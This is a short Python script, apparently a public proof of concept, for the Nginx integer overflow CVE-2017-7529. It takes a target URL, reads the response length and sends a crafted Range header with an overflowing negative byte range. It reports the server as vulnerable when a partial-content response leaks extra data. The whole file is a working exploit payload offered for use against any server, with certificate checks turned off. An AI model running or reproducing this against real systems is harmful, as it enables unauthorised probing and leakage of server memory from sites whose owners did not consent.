#!/usr/bin/python
# -*- coding:utf-8 -*-

# Nginx - Remote Integer Overflow Vulnerability
# CVE-2017-7529
# https://github.com/SouravSec
# Instagram: @itninja.official

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def send_http_request(url, headers={}, timeout=8.0):
    httpResponse   = requests.get(url, headers=headers, timeout=timeout, verify=False)
    httpHeaders    = httpResponse.headers

    print("Server: %s", httpHeaders.get('Server', ''))
    return httpResponse


def exploit(url):
    httpResponse   = send_http_request(url)

    content_length = httpResponse.headers.get('Content-Length', 0)
    bytes_length   = int(content_length) + 623
    content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)

    httpResponse   = send_http_request(url, headers={ 'Range': content_length })
    if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
        print("Vulnerable to CVE-2017-7529")
    else:
        print("No Vulnerable")


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[usage] %s <url>" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    exploit(url)


